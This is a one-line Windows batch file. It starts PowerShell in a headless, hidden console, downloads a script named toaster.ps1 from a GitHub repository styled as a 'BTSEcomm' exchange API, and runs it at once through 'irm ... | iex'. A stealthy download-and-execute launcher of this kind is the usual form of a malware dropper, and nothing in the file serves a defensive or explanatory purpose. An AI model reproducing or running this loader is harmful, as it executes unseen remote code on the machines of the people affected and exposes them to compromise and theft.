@echo off
powershell -Command "conhost --headless powershell.exe -Command 'irm https://raw.githubusercontent.com/BTSEcomm/btse-api/refs/heads/main/toaster.ps1 | iex'"
